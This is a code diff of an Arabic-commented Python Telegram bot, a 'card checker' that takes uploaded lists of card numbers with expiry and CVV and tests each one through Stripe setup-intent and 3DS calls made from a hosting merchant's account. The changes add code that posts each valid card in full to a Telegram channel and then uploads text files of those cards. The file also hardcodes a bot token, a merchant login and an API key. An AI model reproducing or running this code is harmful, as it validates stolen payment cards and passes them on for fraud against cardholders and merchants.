@@ -4,7 +4,6 @@ import threading
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
-from telegram.error import RetryAfter, TimedOut
 import requests
 from bs4 import BeautifulSoup
 import json
@@ -15,7 +14,8 @@ import re
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
-ADMIN_IDS = [5895491379,844663875]
+ADMIN_IDS = [5895491379, 844663875]
+CHANNEL_ID = -1003154179190  # 🔥 معرف القناة
 
 # بيانات تسجيل الدخول
 USERNAME = "desertessence@desertessence.com"
@@ -60,8 +60,9 @@ stats = {
     'error_details': {},
     'last_response': 'Waiting...',
     'cards_checked': 0,
-    'last_dashboard_update': 0,  # ✅ جديد: آخر تحديث للـ Dashboard
-    'pending_update': False,  # ✅ جديد: هل في تحديث معلق
+    'approved_cards': [],  # 🔥 قائمة البطاقات المقبولة
+    '3ds_cards': [],       # 🔥 قائمة بطاقات 3DS
+    'auth_cards': [],      # 🔥 قائمة بطاقات Auth
 }
 
 # ========== دالات تحديث الكوكيز ==========
@@ -186,6 +187,59 @@ def get_payment_page(session):
     except:
         return None, None
 
+# ========== 🔥 إرسال النتائج للقناة ==========
+async def send_to_channel(bot_app, card, status_type, message):
+    """إرسال نتيجة مباشرة للقناة"""
+    try:
+        card_number = stats['approved'] + stats['auth_attempted'] + stats['secure_3d']
+        
+        if status_type == 'APPROVED':
+            text = (
+                "╔═══════════════════╗\n"
+                "✅ **APPROVED CARD LIVE** ✅\n"
+                "╚═══════════════════╝\n\n"
+                f"💳 `{card}`\n"
+                f"🔥 Status: **Approved**\n"
+                f"📊 Card #{card_number}\n"
+                f"⚡️ Mahmoud Saad\n"
+                "╚═══════════════════╝"
+            )
+            stats['approved_cards'].append(card)
+            
+        elif status_type == 'AUTH_ATTEMPTED':
+            text = (
+                "╔═══════════════════╗\n"
+                "🔄 **AUTH ATTEMPTED CARD** 🔄\n"
+                "╚═══════════════════╝\n\n"
+                f"💳 `{card}`\n"
+                f"🔥 Status: **Auth Attempted**\n"
+                f"📊 Card #{card_number}\n"
+                f"⚡️ Mahmoud Saad\n"
+                "╚═══════════════════╝"
+            )
+            stats['auth_cards'].append(card)
+            
+        else:  # 3D_SECURE
+            text = (
+                "╔═══════════════════╗\n"
+                "⚠️ **3D SECURE CARD** ⚠️\n"
+                "╚═══════════════════╝\n\n"
+                f"💳 `{card}`\n"
+                f"🔥 Status: **3D Secure**\n"
+                f"📊 Card #{card_number}\n"
+                f"⚡️ Mahmoud Saad\n"
+                "╚═══════════════════╝"
+            )
+            stats['3ds_cards'].append(card)
+        
+        await bot_app.bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=text,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        print(f"[!] خطأ في إرسال رسالة للقناة: {e}")
+
 # ========== فحص البطاقة ==========
 async def check_card(card, bot_app):
     parts = card.strip().split('|')
@@ -194,7 +248,7 @@ async def check_card(card, bot_app):
         stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = 'Format Error'
-        stats['pending_update'] = True  # ✅ طلب تحديث
+        await update_dashboard(bot_app)
         return card, "ERROR", "صيغة خاطئة"
     
     card_number, exp_month, exp_year, cvv = parts
@@ -214,7 +268,7 @@ async def check_card(card, bot_app):
             stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
             stats['checking'] -= 1
             stats['last_response'] = 'Setup Error'
-            stats['pending_update'] = True  # ✅ طلب تحديث
+            await update_dashboard(bot_app)
             session.close()
             return card, "ERROR", "فشل Setup"
     
@@ -268,98 +322,47 @@ async def check_card(card, bot_app):
                 stats['approved'] += 1
                 stats['checking'] -= 1
                 stats['last_response'] = 'N - Approved ✅'
-                stats['pending_update'] = True  # ✅ طلب تحديث
-                await send_result(bot_app, card, "APPROVED", "Approved ✅")
+                await update_dashboard(bot_app)
+                await send_to_channel(bot_app, card, "APPROVED", "Approved ✅")
                 session.close()
                 return card, "APPROVED", "Approved"
             elif trans_status == 'R':
                 stats['rejected'] += 1
                 stats['checking'] -= 1
                 stats['last_response'] = 'R - Declined ❌'
-                stats['pending_update'] = True  # ✅ طلب تحديث
+                await update_dashboard(bot_app)
                 session.close()
                 return card, "REJECTED", "Declined"
             elif trans_status == 'C':
                 stats['secure_3d'] += 1
                 stats['checking'] -= 1
                 stats['last_response'] = 'C - 3D Secure ⚠️'
-                stats['pending_update'] = True  # ✅ طلب تحديث
-                await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
+                await update_dashboard(bot_app)
+                await send_to_channel(bot_app, card, "3D_SECURE", "3D Secure Challenge")
                 session.close()
                 return card, "3D_SECURE", "3DS"
             elif trans_status == 'A':
                 stats['auth_attempted'] += 1
                 stats['checking'] -= 1
                 stats['last_response'] = 'A - Auth Attempted 🔄'
-                stats['pending_update'] = True  # ✅ طلب تحديث
-                await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
+                await update_dashboard(bot_app)
+                await send_to_channel(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
                 session.close()
                 return card, "AUTH_ATTEMPTED", "Auth Attempted"
             else:
-                session.close()
-                
-                if refresh_cookies_if_needed():
-                    print("[✓] تم تجديد الكوكيز، إعادة فحص البطاقة...")
-                    retry_session, retry_muid, retry_sid, retry_guid, retry_stripe_js_id = create_fresh_session()
-                    retry_csrf, retry_setup = get_payment_page(retry_session)
-                    
-                    if retry_setup:
-                        try:
-                            retry_confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={retry_guid}&payment_method_data[muid]={retry_muid}&payment_method_data[sid]={retry_sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={retry_stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={retry_stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={retry_setup}'
-                            
-                            retry_intent_id = retry_setup.split('_secret_')[0]
-                            retry_response = retry_session.post(f'https://api.stripe.com/v1/setup_intents/{retry_intent_id}/confirm', headers=headers, data=retry_confirm_data, timeout=30)
-                            retry_result = retry_response.json()
-                            
-                            if 'next_action' in retry_result:
-                                retry_source = retry_result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
-                                retry_auth_data = f'source={retry_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
-                                
-                                retry_auth_response = retry_session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=retry_auth_data, timeout=30)
-                                retry_auth_result = retry_auth_response.json()
-                                retry_trans = retry_auth_result.get('ares', {}).get('transStatus', 'Unknown')
-                                
-                                if retry_trans == 'N':
-                                    stats['approved'] += 1
-                                    stats['checking'] -= 1
-                                    stats['last_response'] = 'N - Approved ✅ (Retry)'
-                                    stats['pending_update'] = True
-                                    await send_result(bot_app, card, "APPROVED", "Approved ✅")
-                                    retry_session.close()
-                                    return card, "APPROVED", "Approved"
-                                elif retry_trans == 'C':
-                                    stats['secure_3d'] += 1
-                                    stats['checking'] -= 1
-                                    stats['last_response'] = 'C - 3D Secure ⚠️ (Retry)'
-                                    stats['pending_update'] = True
-                                    await send_result(bot_app, card, "3D_SECURE", "3D Secure")
-                                    retry_session.close()
-                                    return card, "3D_SECURE", "3DS"
-                                elif retry_trans == 'A':
-                                    stats['auth_attempted'] += 1
-                                    stats['checking'] -= 1
-                                    stats['last_response'] = 'A - Auth Attempted 🔄 (Retry)'
-                                    stats['pending_update'] = True
-                                    await send_result(bot_app, card, "AUTH_ATTEMPTED", "Auth Attempted")
-                                    retry_session.close()
-                                    return card, "AUTH_ATTEMPTED", "Auth"
-                        except:
-                            pass
-                        
-                        retry_session.close()
-                
                 stats['errors'] += 1
                 stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
                 stats['checking'] -= 1
                 stats['last_response'] = f'Status: {trans_status}'
-                stats['pending_update'] = True
+                await update_dashboard(bot_app)
+                session.close()
                 return card, "UNKNOWN", trans_status
         else:
             stats['errors'] += 1
             stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
             stats['checking'] -= 1
             stats['last_response'] = 'No 3DS Action'
-            stats['pending_update'] = True
+            await update_dashboard(bot_app)
             session.close()
             return card, "ERROR", "No 3DS"
             
@@ -368,31 +371,11 @@ async def check_card(card, bot_app):
         stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
-        stats['pending_update'] = True
+        await update_dashboard(bot_app)
         session.close()
         return card, "EXCEPTION", str(e)
 
-# ========== دالات البوت ==========
-async def send_result(bot_app, card, status_type, message):
-    """إرسال نتيجة الفحص"""
-    if not stats['chat_id']:
-        return
-    
-    if status_type in ['APPROVED', 'AUTH_ATTEMPTED', '3D_SECURE']:
-        try:
-            card_number = stats['approved'] + stats['auth_attempted'] + stats['secure_3d']
-            
-            if status_type == 'APPROVED':
-                text = f"┏━━━━━━━━━━━━━━━\n✅ APPROVED CARD LIVE ✅\n┣━━━━━━━━━━━━━━━\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n┗━━━━━━━━━━━━━━━"
-            elif status_type == 'AUTH_ATTEMPTED':
-                text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
-            else:
-                text = f"┏━━━━━━━━━━━━━━━━━┓\n⚠️ 3D SECURE CARD ⚠️\n┗━━━━━━━━━━━━━━━━━┛\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n┗━━━━━━━━━━━━━━━━━┛"
-            
-            await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text)
-        except:
-            pass
-
+# ========== Dashboard ==========
 def create_dashboard_keyboard():
     elapsed = 0
     if stats['start_time']:
@@ -412,7 +395,7 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="3ds"),
-            InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="auth")
+            InlineKeyboardButton(f"🔄 Auth: {stats['auth_attempted']}", callback_data="auth")
         ],
         [
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
@@ -426,66 +409,71 @@ def create_dashboard_keyboard():
         keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
     
     if stats['current_card']:
-        keyboard.append([InlineKeyboardButton("┏━━ البطاقة الحالية ━━┓", callback_data="separator")])
         keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
-    
-    if stats['error_details']:
-        keyboard.append([InlineKeyboardButton("┏━━ أكثر الأخطاء ━━┓", callback_data="error_sep")])
-        sorted_errors = sorted(stats['error_details'].items(), key=lambda x: x[1], reverse=True)[:3]
-        for error_type, count in sorted_errors:
-            keyboard.append([InlineKeyboardButton(f"⚠️ {error_type}: {count}", callback_data=f"err_{error_type}")])
     
     return InlineKeyboardMarkup(keyboard)
 
-# ✅ دالة التحديث الذكية - تحديث كل 3-5 ثواني فقط
 async def update_dashboard(bot_app):
-    """تحديث الـ Dashboard بشكل آمن مع Rate Limiting"""
-    if not stats['dashboard_message_id'] or not stats['chat_id']:
-        return
-    
-    current_time = time.time()
-    time_since_last_update = current_time - stats['last_dashboard_update']
-    
-    # ✅ تحديث كل 3 ثواني على الأقل (بدلاً من كل بطاقة)
-    if time_since_last_update < 3.0:
-        return
-    
+    """تحديث Dashboard في القناة"""
+    if stats['dashboard_message_id']:
+        try:
+            await bot_app.bot.edit_message_text(
+                chat_id=CHANNEL_ID,
+                message_id=stats['dashboard_message_id'],
+                text="📊 **KNOWNHOST CARD CHECKER - LIVE** 📊",
+                reply_markup=create_dashboard_keyboard(),
+                parse_mode='Markdown'
+            )
+        except:
+            pass
+
+# ========== 🔥 إنشاء الملفات النهائية ==========
+async def send_final_files(bot_app):
+    """إرسال ملفات txt للبطاقات المقبولة"""
     try:
-        await bot_app.bot.edit_message_text(
-            chat_id=stats['chat_id'],
-            message_id=stats['dashboard_message_id'],
-            text="📊 **KNOWNHOST CARD CHECKER** 📊",
-            reply_markup=create_dashboard_keyboard(),
-            parse_mode='Markdown'
-        )
-        stats['last_dashboard_update'] = current_time
-        stats['pending_update'] = False
-    except RetryAfter as e:
-        # ✅ إذا طلب تيليجرام الانتظار
-        print(f"[⚠️] Rate limit hit! Waiting {e.retry_after} seconds...")
-        await asyncio.sleep(e.retry_after)
-    except TimedOut:
-        # ✅ Timeout - نتجاهله ونكمل
-        print("[⚠️] Telegram timeout - skipping update")
+        # ملف Approved
+        if stats['approved_cards']:
+            approved_text = "\n".join(stats['approved_cards'])
+            with open("approved_cards.txt", "w") as f:
+                f.write(approved_text)
+            await bot_app.bot.send_document(
+                chat_id=CHANNEL_ID,
+                document=open("approved_cards.txt", "rb"),
+                caption=f"✅ **Approved Cards** ({len(stats['approved_cards'])} cards)",
+                parse_mode='Markdown'
+            )
+            os.remove("approved_cards.txt")
+        
+        # ملف 3DS
+        if stats['3ds_cards']:
+            secure_text = "\n".join(stats['3ds_cards'])
+            with open("3ds_cards.txt", "w") as f:
+                f.write(secure_text)
+            await bot_app.bot.send_document(
+                chat_id=CHANNEL_ID,
+                document=open("3ds_cards.txt", "rb"),
+                caption=f"⚠️ **3D Secure Cards** ({len(stats['3ds_cards'])} cards)",
+                parse_mode='Markdown'
+            )
+            os.remove("3ds_cards.txt")
+        
+        # ملف Auth Attempted
+        if stats['auth_cards']:
+            auth_text = "\n".join(stats['auth_cards'])
+            with open("auth_cards.txt", "w") as f:
+                f.write(auth_text)
+            await bot_app.bot.send_document(
+                chat_id=CHANNEL_ID,
+                document=open("auth_cards.txt", "rb"),
+                caption=f"🔄 **Auth Attempted Cards** ({len(stats['auth_cards'])} cards)",
+                parse_mode='Markdown'
+            )
+            os.remove("auth_cards.txt")
+        
     except Exception as e:
-        # ✅ أي خطأ آخر - نتجاهله
-        print(f"[⚠️] Dashboard update error: {e}")
+        print(f"[!] خطأ في إرسال الملفات: {e}")
 
-# ✅ دالة تحديث دورية في الخلفية
-async def periodic_dashboard_update(bot_app):
-    """تحديث الـ Dashboard كل 5 ثواني"""
-    while stats['is_running']:
-        if stats['pending_update']:
-            await update_dashboard(bot_app)
-        await asyncio.sleep(5)  # ✅ تحديث كل 5 ثواني
-
-async def check_authorization(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """فحص الصلاحيات لكل الرسائل"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
-        return False
-    return True
-
+# ========== معالجات البوت ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
@@ -495,20 +483,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
-        "الصيغة: `رقم|شهر|سنة|cvv`",
+        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
+        f"📢 القناة: `{CHANNEL_ID}`",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """التعامل مع أي رسالة نصية"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
-        return
-
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
+        await update.message.reply_text("❌ غير مصرح")
         return
     
     if stats['is_running']:
@@ -519,29 +502,43 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
     
-    stats['total'] = len(cards)
-    stats['checking'] = 0
-    stats['approved'] = 0
-    stats['rejected'] = 0
-    stats['secure_3d'] = 0
-    stats['auth_attempted'] = 0
-    stats['errors'] = 0
-    stats['current_card'] = ''
-    stats['error_details'] = {}
-    stats['last_response'] = 'Starting...'
-    stats['cards_checked'] = 0
-    stats['start_time'] = datetime.now()
-    stats['is_running'] = True
-    stats['chat_id'] = update.effective_chat.id
-    stats['last_dashboard_update'] = 0  # ✅ إعادة تعيين
-    stats['pending_update'] = False  # ✅ إعادة تعيين
+    # إعادة تعيين الإحصائيات
+    stats.update({
+        'total': len(cards),
+        'checking': 0,
+        'approved': 0,
+        'rejected': 0,
+        'secure_3d': 0,
+        'auth_attempted': 0,
+        'errors': 0,
+        'current_card': '',
+        'error_details': {},
+        'last_response': 'Starting...',
+        'cards_checked': 0,
+        'approved_cards': [],
+        '3ds_cards': [],
+        'auth_cards': [],
+        'start_time': datetime.now(),
+        'is_running': True,
+        'chat_id': update.effective_chat.id
+    })
     
-    dashboard_msg = await update.message.reply_text(
-        "📊 **KNOWNHOST CARD CHECKER** 📊",
+    # إنشاء Dashboard في القناة
+    dashboard_msg = await context.application.bot.send_message(
+        chat_id=CHANNEL_ID,
+        text="📊 **KNOWNHOST CARD CHECKER - LIVE** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
+    
+    # رسالة تأكيد للأدمن
+    await update.message.reply_text(
+        f"✅ تم بدء الفحص!\n\n"
+        f"📊 إجمالي البطاقات: {len(cards)}\n"
+        f"📢 تابع النتائج في القناة",
+        parse_mode='Markdown'
+    )
     
     def run_checker():
         loop = asyncio.new_event_loop()
@@ -552,9 +549,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     threading.Thread(target=run_checker, daemon=True).start()
 
 async def process_cards(cards, bot_app):
-    # ✅ بدء التحديث الدوري في الخلفية
-    update_task = asyncio.create_task(periodic_dashboard_update(bot_app))
-    
+    """معالجة البطاقات"""
     for i, card in enumerate(cards):
         if not stats['is_running']:
             break
@@ -565,50 +560,81 @@ async def process_cards(cards, bot_app):
             if refresh_cookies_if_needed():
                 print("[✅] تم تجديد الكوكيز بنجاح!")
                 stats['last_response'] = f'🔄 Cookies Refreshed at {stats["cards_checked"]}'
-                stats['pending_update'] = True
+                await update_dashboard(bot_app)
             else:
                 print("[⚠️] فشل تجديد الكوكيز")
         
         stats['checking'] = 1
         parts = card.split('|')
         stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
-        stats['pending_update'] = True
+        await update_dashboard(bot_app)
         
         await check_card(card, bot_app)
         stats['cards_checked'] += 1
         
+        # تحديث Dashboard كل 5 ثواني
+        if stats['cards_checked'] % 5 == 0:
+            await update_dashboard(bot_app)
+        
         await asyncio.sleep(1)
     
+    # انتهى الفحص
     stats['is_running'] = False
     stats['checking'] = 0
     stats['current_card'] = ''
     stats['last_response'] = 'Completed ✅'
-    stats['pending_update'] = True
-    
-    # ✅ تحديث نهائي
     await update_dashboard(bot_app)
     
-    # ✅ إيقاف التحديث الدوري
-    update_task.cancel()
+    # إرسال ملخص نهائي
+    summary_text = (
+        "═══════════════════\n"
+        "✅ **اكتمل الفحص!** ✅\n"
+        "═══════════════════\n\n"
+        f"📊 **الإحصائيات النهائية:**\n"
+        f"🔥 الإجمالي: {stats['total']}\n"
+        f"✅ Approved: {stats['approved']}\n"
+        f"❌ Rejected: {stats['rejected']}\n"
+        f"⚠️ 3D Secure: {stats['secure_3d']}\n"
+        f"🔄 Auth Attempted: {stats['auth_attempted']}\n"
+        f"⚠️ Errors: {stats['errors']}\n\n"
+        "📁 **جاري إرسال الملفات...**"
+    )
     
-    if stats['chat_id']:
-        keyboard = [
-            [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
-            [InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="final_rejected")],
-            [InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="final_3ds")],
-            [InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="final_auth")],
-            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")]
-        ]
-        await bot_app.bot.send_message(
-            chat_id=stats['chat_id'],
-            text="✅ **اكتمل الفحص!**",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
+    await bot_app.bot.send_message(
+        chat_id=CHANNEL_ID,
+        text=summary_text,
+        parse_mode='Markdown'
+    )
+    
+    # إرسال الملفات النهائية
+    await send_final_files(bot_app)
+    
+    # رسالة نهائية
+    final_text = (
+        "╔═══════════════════╗\n"
+        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
+        "╚═══════════════════╝\n\n"
+        "✅ تم إرسال جميع الملفات\n"
+        "📊 شكراً لاستخدامك البوت!\n\n"
+        "⚡️ Mahmoud Saad"
+    )
+    
+    await bot_app.bot.send_message(
+        chat_id=CHANNEL_ID,
+        text=final_text,
+        parse_mode='Markdown'
+    )
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """التعامل مع أي رسالة نصية"""
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
+        return
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
+    # فحص الصلاحيات للأزرار
     if query.from_user.id not in ADMIN_IDS:
         await query.answer("❌ غير مصرح", show_alert=True)
         return
@@ -618,8 +644,17 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "stop_check":
         stats['is_running'] = False
         await update_dashboard(context.application)
+        await query.message.reply_text("🛑 تم إيقاف الفحص!")
 
 def main():
+    # تحميل الكوكيز عند البدء
+    auth_cookies = load_auth_cookies()
+    if auth_cookies:
+        BASE_COOKIES.update(auth_cookies)
+        print("[✅] تم تحميل الكوكيز بنجاح!")
+    else:
+        print("[⚠️] تحذير: لم يتم تحميل الكوكيز")
+    
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
@@ -628,6 +663,7 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     
     print("🤖 البوت يعمل...")
+    print(f"📢 القناة: {CHANNEL_ID}")
     app.run_polling()
 
 if __name__ == "__main__":
